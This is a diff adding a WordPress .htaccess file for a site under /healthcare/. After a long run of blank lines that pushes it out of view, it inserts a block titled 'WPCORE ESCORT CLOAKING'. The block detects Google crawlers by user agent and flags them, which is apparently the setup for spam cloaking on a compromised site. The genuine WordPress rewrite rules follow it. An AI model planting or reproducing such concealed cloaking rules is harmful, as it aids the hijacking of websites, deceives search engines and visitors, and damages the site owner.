@@ -1,0 +1,134 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# BEGIN WPCORE ESCORT CLOAKING
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# Googlebot Detection - Set ENV flag
+RewriteCond %{HTTP_USER_AGENT} Googlebot [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} AdsBot-Google [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Mediapartners-Google [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Google-InspectionTool [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} GoogleOther [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Storebot-Google [NC]
+RewriteRule .* - [E=WPCORE_GOOGLEBOT:1]
+
+</IfModule>
+# END WPCORE ESCORT CLOAKING
+
+# BEGIN WordPress
+# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /healthcare/
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /healthcare/index.php [L]
+</IfModule>
+
+# END WordPress
